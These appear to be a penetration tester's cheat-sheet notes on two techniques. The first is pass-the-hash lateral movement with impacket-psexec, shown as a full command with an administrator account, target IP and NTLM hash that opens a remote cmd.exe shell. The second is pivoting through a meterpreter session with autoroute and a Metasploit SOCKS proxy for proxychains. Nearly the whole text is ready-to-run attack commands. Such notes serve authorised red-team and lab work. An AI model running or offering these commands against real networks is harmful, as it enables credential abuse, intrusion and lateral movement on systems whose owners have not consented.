### PTH with impacket-psexec

Uses ADMIN$ share for connectivity.  Uploads exe and executes it.  Once executed, cmd.exe screen opens up on kali as domain user.

```bash
impacket-psexec corp1/administrator@192.168.134.5 -hashes :2892d26cdf84d7a70e2eb3b9f05c425e "C:\\windows\\system32\\cmd.exe"
```

### Pivot with a meterpreter session and proxy chains

Step 1: Create the route to route traffic through session

```bash
meterpreter > run autoroute -s 10.10.x.x/24
# Or for specific sessions:
use post/multi/manage/autoroute
set SESSION <session_id>
run
```


Step 2: Setup socks proxy.  Might need to turn off proxy_dns in proxychains conf to fix dns.

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080 # Or any desired port
set VERSION 4a
run -j
```

